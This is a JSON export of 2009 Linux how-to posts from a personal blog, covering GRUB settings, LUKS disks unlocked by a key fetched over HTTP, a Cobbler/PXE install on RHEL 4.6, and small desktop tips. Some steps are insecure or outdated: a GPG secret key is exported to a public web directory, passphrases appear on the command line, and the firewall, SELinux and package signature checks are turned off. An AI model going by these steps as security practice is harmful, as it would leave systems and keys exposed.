"Disable IPv6 in Debian", "url": "/posts/disable-ipv6-in-debian/", "categories": "Linux, Networking, linux-old.xvx.cz", "tags": "debian, grub", "date": "2009-12-29 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2009/12/disable-ipv6-in-debian/ I had a problem with Java Webstart applications, which were using IPv6 by default. Because I’m not using IPv6 at all I decided to disable this protocol completely. There are many pages about how to disable IPv6 under Debian, but most of them were not working for me. The easiest one worked well: Modify /etc/default/grub: GRUB_CMDLINE_LINUX_DEFAULT=\"ipv6.disable=1\" Don’t forget to run update-grub after the change (and reboot). Then if you run ip a you should not see any IPv6 addresses…" }, { "title": "Debian with GRUB2 and serial connection", "url": "/posts/debian-with-grub2-and-serial-connection/", "categories": "Linux, linux-old.xvx.cz", "tags": "debian, grub", "date": "2009-08-05 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2009/08/debian-with-grub2-and-serial-connection/ Sometimes I’m using the serial connection to my server if anything goes wrong. It’s because I don’t have a monitor/TV attached to it. I had some problems setting it up using Debian in GRUB2 after I upgraded to grub-pc. Here is a short guide on how to do it: Edit the file containing the configuration in Debian: /etc/default/grub # If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. GRUB_DEFAULT=0 GRUB_TIMEOUT=1 GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT=\"console=tty0 console=ttyS0,9600n8\" # Uncomment to disable graphical terminal (grub-pc only) GRUB_TERMINAL=serial GRUB_SERIAL_COMMAND=\"serial --speed=9600 --unit=0 --word=8 --parity=no --stop=1\" # The resolution used on graphical terminal # note that you can use only modes which your graphic card supports via VBE # you can see them in real GRUB with the command `vbeinfo' #GRUB_GFXMODE=640x480 # Uncomment if you don't want GRUB to pass \"root=UUID=xxx\" parameter to Linux #GRUB_DISABLE_LINUX_UUID=true Don’t forget to run update-grub after the change." }, { "title": "Encrypted disks with remote key placed on http server", "url": "/posts/encrypted-disks-with-remote-key-placed-on-http-server/", "categories": "Linux, Storage, Security, linux-old.xvx.cz", "tags": "lvm, bash, security", "date": "2009-06-07 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2009/06/crypted-disks-with-remote-key-placed-on-http-server/ This page contains some information on how to create an encrypted disk using dm_crypt, lvm, gpg with a remote key stored on an HTTP server. The advantage is to have the key, used for unlocking encrypted disk(s), somewhere on the server instead of having it on USB. You can easily delete this key if your disks are stolen and nobody can access them any longer… If you use a USB stick to save the key then you need to have it connected to the machine with the encrypted disks every reboot - usually it will be plugged all the time to the server which destroys all security. Keys are downloaded automatically every reboot from remote HTTP server (if not your disks will remain locked) All commands were tested on Debian and should be also applicable on other distributions. Remote server side Generate a new key pair: gpg --gen-key List the keys and write down the secret key ID 9BB7698A: gpg --list-keys /root/.gnupg/pubring.gpg ------------------------ pub 1024D/9BB7698A 2009-06-07 uid test_name (test_comment) test@xvx.cz sub 2048g/A0DA1037 2009-06-07 Export the private key and save it somewhere “public” temporarily… gpg --verbose --export-options export-attributes,export-sensitive-revkeys --export-secret-keys 9BB7698A &gt; ~/public_html/secret.key Generate a random key and encrypt it with the previously generated private key. That will be the key used for dm-crypt: head -c 256 /dev/urandom | gpg --batch --passphrase test --verbose --throw-keyids --local-user 9BB7698A --sign --yes --cipher-algo AES256 --encrypt --hidden-recipient 9BB7698A --no-encrypt-to --output ~/public_html/abcd.html - Client side (where the data will be encrypted) Log in to the machine where you want to encrypt your data. Create an LVM volume: #lvremove -f lvdata #vgremove -f vgdata pvcreate -ff -v /dev/hda2 /dev/hdb1 vgcreate -v -s 16 vgdata /dev/hda2 /dev/hdb1 lvcreate -v -l 100%FREE vgdata -n lvdata Import the secret private key from the HTTP server (don’t forget to remove secret.key from the server after this) and then download and decrypt the cipher key for dm-crypt /mykey: #gpg --yes --delete-secret-keys 9BB7698A #gpg --yes --batch --delete-keys 9BB7698A wget https://10.0.2.2/~ruzickap/secret.key -O - | gpg --import - wget https://10.0.2.2/~ruzickap/abcd.html -O - | gpg --quiet --passphrase test --batch --decrypt &gt; /mykey Encrypt the lvm vgdata-lvdata using /mykey: cryptsetup -s 512 -c aes-xts-plain luksFormat /dev/mapper/vgdata-lvdata /mykey Add the dm-crypt key /mykey to the “LUKS”: cryptsetup --key-file=/mykey luksOpen /dev/mapper/vgdata-lvdata vgdata-lvdata_crypt Format opened LUKS and copy there some data: mkfs.ext3 /dev/mapper/vgdata-lvdata_crypt mount /dev/mapper/vgdata-lvdata_crypt /mnt cp /etc/* /mnt/ umount /mnt cryptsetup luksClose vgdata-lvdata_crypt rm /mykey Now we have to create a short script /script that will download the key from the remote server and decrypt it using the imported secret key with GPG and display it on the screen: #!/bin/bash /usr/bin/wget --quiet https://10.0.2.2/~ruzickap/abcd.html -O - | /usr/bin/gpg --quiet --homedir /root/.gnupg --quiet --passphrase xxxx --batch --decrypt 2&gt; /dev/null We should not forget to mount our encrypted filesystem after boot /etc/rc.local: echo \"Mounting encrypted file system in 5 seconds...\" sleep 5 cryptdisks_start vgdata-lvdata_crypt mount /mnt Another necessary thing needs to be done - putting the right information to /etc/crypttab: vgdata-lvdata_crypt /dev/mapper/vgdata-lvdata none noauto,cipher=aes-xts-plain,size=512,luks,tries=1,checkargs=ext2,keyscript=/script We don’t want to mount the encrypted filesystem with others, because the network is not ready at that time /etc/fstab: /dev/mapper/vgdata-lvdata_crypt /mnt ext3 noauto,rw,exec,async,noatime,nocheck,data=writeback 0 0 This is definitely not the best way to secure your data, but it’s better than nothing. Feel free to combine this method with keys stored on USB drive." }, { "title": "Cobbler and yum in RHEL 4.6", "url": "/posts/cobbler-and-yum-in-rhel-46/", "categories": "Linux, Networking, linux-old.xvx.cz", "tags": "rhel, cobbler, pxe", "date": "2009-06-06 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2009/06/cobbler-and-yum-in-rhel-46/ Here’s a short how-to for installing cobbler with yum on RHEL 4.6 from scratch. Install RHEL 4.6 or CentOS 4.6 with default partitioning and custom installation (unselect all possible packages during installation procedure). Disable firewall and SELinux. Enable DVD repository by changing the line in /etc/yum.repos.d/CentOS-Media.repo: enabled=1 Install yum: mount /media/cdrom Download packages and install them: mkdir /var/tmp/cobbler-4.6 cd /var/tmp/cobbler-4.6 || exit rpm -i ./python-elementtree-1.2.6-5.el4.centos.x86_64.rpm \\ ./python-urlgrabber-2.9.8-2.noarch.rpm ./sqlite-3.3.6-2.x86_64.rpm \\ ./python-sqlite-1.1.7-1.2.1.x86_64.rpm \\ ./yum-metadata-parser-1.0-8.el4.centos.x86_64.rpm \\ ./centos-yumconf-4-4.5.noarch.rpm \\ ./yum-2.4.3-4.el4.centos.noarch.rpm \\ ./createrepo-0.4.4-2.noarch.rpm yum clean all mkdir /var/tmp/rhel4_repo/ ln -s /media/cdrom/RedHat/RPMS/ /var/tmp/rhel4_repo/RPMS createrepo /var/tmp/rhel4_repo/ cat &gt; /etc/yum.repos.d/RHEL-4.6-Media.repo &lt;&lt; + [rhel4-media] name=RHEL4 - Media baseurl=file:///var/tmp/rhel4_repo/ gpgcheck=0 enabled=1 + createrepo /var/tmp/cobbler-4.6/ cat &gt;&gt; /etc/yum.repos.d/my.repo &lt;&lt; + [my-repo] name=My Repository baseurl=file:///var/tmp/cobbler-4.6/ gpgcheck=0 enabled=1 + Install necessary software from DVD: mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.orig yum -y install wget mc yum -y install httpd tftp-server mod_python python-devel createrepo rsync mkisofs yum -y install perl-Digest-SHA1 perl-Digest-HMAC perl-Socket6 perl-Time-HiRes sysstat perl-libwww-perl # DevSkim: ignore DS126858,DS197836 yum -y install libart_lgpl freetype libpng yum -y install logrotate perl-DateManip yum -y install cman yum -y install dhcp bind yum -y install memtest86+ yum -y install cobbler yum -y install munin munin-node php-ldap chkconfig munin-node on yum -y install yum-utils yum -y install syslinux Disable firewall (just to be sure): chkconfig --level 2345 iptables off service iptables stop Change line in /etc/cobbler/settings to match the IP of the server: default_password_crypted: \"$1$pH3........0B2HB/\" default_name_servers: [192.168.0.129] manage_dhcp: 1 manage_dns: 1 manage_forward_zones: [my.domain.cz] manage_reverse_zones: [192.168.0] next_server: 192.168.0.129 pxe_just_once: 1 server: 192.168.0.129 register_new_installs: 0 xmlrpc_rw_enable: 1 Start cobbler and apache daemon: /etc/init.d/cobblerd start /etc/init.d/httpd start chkconfig httpd on Change ‘disable’ to ‘no’ in /etc/xinetd.d/tftp: disable = yes Cobbler/DHCPd/bind configuration Change listening interface for dhcpd in /etc/sysconfig/dhcpd: DHCPDARGS=eth0; Modify file /etc/cobbler/dhcp.template according to your needs: subnet 192.168.0.0 netmask 255.255.255.0 { option routers 10.226.23.1; option domain-name \"my.domain.cz\"; option domain-name-servers 192.168.0.129; option subnet-mask 255.255.255.0; range dynamic-bootp 192.168.0.200 192.168.0.254; filename \"/pxelinux.0\"; default-lease-time 21600; max-lease-time 43200; next-server $next_server; } Modify /etc/cobbler/named.template like: options { ... # listen-on port 53 { 127.0.0.1; }; ... # allow-query { localhost; }; forwarders { 10.226.32.44; }; ... }; cobbler sync service xinetd restart chkconfig dhcpd on chkconfig named on Now you should run: cobbler check and see something like this: [root@c2virtud tmp]# cobbler check No setup problems found Manual review and editing of /var/lib/cobbler/settings is recommended to tailor cobbler to your particular configuration. Cobbler repository+ installation cobbler import --name=RHEL4.6-x86_64-AS --mirror=/media/cdrom/ cobbler repo add --mirror=/var/tmp/cobbler-4.6/ --name=my-repo cobbler reposync cobbler image add --name=Memtest86+-1.26 --file=/tftpboot/memtest86+-1.26 --image-type=direct cobbler profile copy --name=RHEL4.6-AS-x86_64 --newname=NGP_RHEL4.6-AS-x86_64 cobbler profile copy --name=rescue-RHEL4.6-AS-x86_64 --newname=NGP_rescue-RHEL4.6-AS-x86_64 cobbler profile edit --name=NGP_RHEL4.6-AS-x86_64 --repos=\"my-repo\" cobbler profile edit --name=NGP_rescue-RHEL4.6-AS-x86_64 --repos=\"my-repo\" cobbler sync Edit /etc/yum.repos.d/RHEL-4.6-Media.repo and change one line like: baseurl=file:///var/www/cobbler/ks_mirror/RHEL4.6-x86_64-AS/RedHat Then run: yum clean all PXE configuration Make this the first line of /etc/cobbler/pxe/pxedefault.template, pxeprofile.template, pxesystem.template to enable serial connection: SERIAL 0 115200 Cobbler WebUI Set root password for web access: htdigest /etc/cobbler/users.digest \"Cobbler\" root Change line in /etc/cobbler/modules.conf: module = authn_configfile service cobblerd restart service httpd restart Cobbler host specification cobbler system add --comment=\"c3virt01ce01 machine\" --name=c3virt01ce01 --hostname=c3virt01ce01 --netboot-enabled=1 --profile=NGP_RHEL4.6-AS-x86_64 --name-servers=192.168.0.129 --static=0 --kickstart=/var/lib/cobbler/kickstarts/legacy.ks cobbler system edit --name c3virt01ce01 --interface=eth0 --mac=00:0c:29:68:78:96 --ip=192.168.0.10 --netmask=255.255.255.0 --static=1 --dns-name=c3virt01ce01.my.domain.cz cobbler system edit --name c3virt01ce01 --interface=eth1 --mac=00:0c:29:68:78:b4 --ip=192.168.1.10 --netmask=255.255.255.0 --static=1 cobbler system edit --name c3virt01ce01 --interface=eth2 --mac=00:0c:29:68:78:aa --ip=192.168.2.10 --netmask=255.255.255.0 --static=1 cobbler system edit --name c3virt01ce01 --interface=eth3 --mac=00:0c:29:68:78:be --static=0 cobbler sync Hopefully it will be possible to use PXE boot to install machines." }, { "title": "Trim margins from PDF document", "url": "/posts/trim-margins-from-pdf-document/", "categories": "Linux, linux-old.xvx.cz", "tags": "bash", "date": "2009-06-02 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2009/06/trim-margins-from-pdf-document/ It happened to me once that I wanted to trim margins from a PDF document. It was a manual for the Panasonic G1 camera. You can see huge margins there, because it was officially written for A5 paper and they created a manual for A4. See the picture: I used pdfcrop script from Heiko Oberdiek, which can easily trim margins: pdfcrop.pl --margins 10 panasonic_g1.pdf panasonic_g1-2.pdf Here is the result: I hope this can be useful for somebody who needs this… The KDE PDF viewer Okular has the function “Trim Margins”, which works very well, but you cannot save the PDF…" }, { "title": "digiKam thumbnails and Albums with photos stored on remote shares", "url": "/posts/digikam-thumbnails-and-albums-with-photos-stored-on-remote-shares/", "categories": "Linux, Photography, linux-old.xvx.cz", "tags": "photo-editing, bash", "date": "2009-03-22 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2009/03/digikam-thumbnails-and-albums-with-photos-stored-on-remote-shares/ My photo collection is stored on the server and accessed by cifs protocol to my notebooks. I’m using digiKam to browse my collection in KDE. This software is storing all thumbnails in ~/.thumbnails/ according to the thumbnail spec and creates a sqlite database where it stores all information about photos. The advantage is, that these thumbnails can be also used by other KDE viewers (like Gwenview). The disadvantage can be that other viewers can generate new thumbnails which are no longer useful and the size of that directory can grow… I decided to write a script which can delete all useless thumbnails and keep only the ones used by digiKam. The reason is simple - I don’t want to remove all thumbnails and regenerate them again only from digiKam, because I have more than 35k photos so it takes a long time… Here is my digiKam collection configuration: This script deletes all thumbnails of the photos in $HOME/.thumbnails/large/ which are not on network shares: (It preserves all the thumbnails of photos stored on network share, which take ages to create because of the network or which are not changing, and deletes all local ones) thumbnails_delete.pl Maybe you can find it helpful…" }, { "title": "How to store Google Maps (or any other page) as jpg or png", "url": "/posts/how-to-store-google-maps-or-any-other-page-as-jpg-or-png/", "categories": "Linux, linux-old.xvx.cz", "tags": "", "date": "2009-03-17 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2009/03/how-to-store-google-maps-or-any-other-page-as-jpg-or-png/ I’m using my old Palm TX to navigate during my travels. I don’t have GPS, but I usually get some maps from the web, store them as jpg and view them on Palm as a picture. I had problems getting big maps from Google to jpg, because all screen snapshot programs can only get actual “screen” (usually just 1440x900). My Palm and other devices can handle much bigger images and it’s possible to scroll them. My laptop screen resolution was quite limiting… :-( I found a solution in KDE: Install Firefox add-on called Abduction! It will allow you to save pages or part of the page as image (File -&gt; Save Page As Image…) Run Firefox and choose your place in the map. Press ALT + F3 -&gt; Advanced -&gt; Special Windows Settings… Advanced Windows Settings - KDE Select Geometry tab and modify “Size” parameters: Edit Window Specific Settings Kwin Then your Firefox should be much bigger (above screen borders) and you should be able to save “one big” page as image…" }, { "title": "HD Trailers downloaded by wget", "url": "/posts/hd-trailers-downloaded-by-wget/", "categories": "Linux, linux-old.xvx.cz", "tags": "bash", "date": "2009-03-05 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2009/03/hd-trailers-downloaded-by-wget/ I found a nice page hd-trailers.net accessing HD trailers from Yahoo or Apple through downloadable mov files. It’s quite useful to have mov files instead of using flash player especially if you have a slower Internet connection. Here is a short wget command which downloads mov files from the Apple site into directories: #!/bin/bash #480, 720, 1080 RESOLUTION=480 wget --recursive --level=2 --accept \"*${RESOLUTION}p.mov\" \\ --span-hosts --domains=movies.apple.com,www.hd-trailers.net \\ --no-host-directories --cut-dirs=2 --exclude-directories=/blog \\ http://www.hd-trailers.net/ Enjoy ;-)" }, { "title": "BOINC managed from command line - boinc_cmd", "url": "/posts/boinc-managed-from-command-line-boinc-cmd/", "categories": "Linux, linux-old.xvx.cz", "tags": "boinc, bash", "date": "2009-02-20 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2009/02/boinc-managed-from-command-line-boinc_cmd/ I installed BOINC to my server to help the world with scientific problems. It’s really easy to install it from repositories of various distributions, but it’s not so easy to configure it. Usually you can use BOINC manager to configure BOINC. Unfortunately it is graphical application and it uses port 31416 to connect to local/remote BOINC installations. For obvious reasons you don’t want to install GUI applications on servers and you also don’t want to enable ports on firewall. That’s time for boinc_cmd and here are a few tips on how to use it. Set http proxy 10.226.56.40:3128: boinc_cmd --passwd my_password --set_proxy_settings 10.226.56.40 3128 \"\" \"\" \"\" \"\" \"\" \"\" \"\" Count all the time: boinc_cmd --passwd my_password --set_run_mode always Don’t get more work: boinc_cmd --passwd my_password --project http://abcathome.com/ nomorework Attach to the project: boinc_cmd --passwd my_password --project_attach http://abcathome.com/ project_id Update project preferences: boinc_cmd --passwd my_password --project http://abcathome.com/ update" } ]
